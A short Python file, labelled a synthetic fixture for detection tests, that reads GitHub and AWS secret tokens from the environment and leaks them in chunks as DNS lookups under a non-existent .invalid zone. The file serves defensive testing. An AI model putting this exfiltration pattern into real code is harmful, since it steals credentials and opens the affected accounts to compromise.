# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shape: provider tokens from the environment, base32-encoded and looked up chunk by chunk
# as DNS labels under a zone. Zone is a non-existent .invalid domain.
import base64
import os
import socket

tok = os.environ.get('GITHUB_TOKEN', '') + os.environ.get('AWS_SECRET_ACCESS_KEY', '')
enc = base64.b32encode(tok.encode()).decode().strip('=').lower()
for i in range(0, len(enc), 50):
    socket.gethostbyname(f'{enc[i:i + 50]}.{i}.t.example.invalid')
